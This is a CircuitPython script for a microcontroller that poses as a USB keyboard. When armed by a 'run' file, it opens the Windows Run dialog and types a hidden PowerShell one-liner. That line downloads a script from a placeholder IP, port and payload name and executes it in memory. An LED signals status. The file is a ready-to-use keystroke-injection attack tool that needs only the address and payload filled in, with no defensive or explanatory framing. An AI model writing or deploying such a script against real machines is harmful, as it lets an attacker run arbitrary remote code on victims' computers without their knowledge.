import time, os, usb_hid, board, digitalio
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

IP = "IP"
PORT = "PORT"
Payload = "PAYLOAD NAME.ps1"

if 'run' in os.listdir():    
    time.sleep(2)
    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(2)
    layout.write(f"""powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://{IP}:{PORT}/{Payload}');"\n""")
    led.value = True
    time.sleep(15)
    led.value = False

while not 'run' in os.listdir():
    led.value = True
    time.sleep(0.5)
    led.value = False
    time.sleep(0.5)
